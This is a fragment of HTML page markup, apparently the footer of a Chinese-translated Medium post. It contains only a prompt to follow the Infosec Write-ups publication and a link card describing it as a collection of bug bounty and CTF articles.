lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><em class="mr">关注</em> <a class="ae lu" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="mr"> Infosec报道</em> </a> <em class="mr">获取更多此类精彩报道。</em></p><div class="oc od gp gr oe of"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="og ab fo"><div class="oh ab oi cl cj oj"><h2 class="bd ir gy z fp ok fr fs ol fu fw ip bi translated">信息安全报道</h2><div class="om l"><h3 class="bd b gy z fp ok fr fs ol fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="on l"><p class="bd b dl z fp ok fr fs ol fu fw dk translated">medium.com</p></div></div><div class="oo l"><div class="op l oq or os oo ot jw of"/></div></div></a></div></div></div>    
</body>
</html>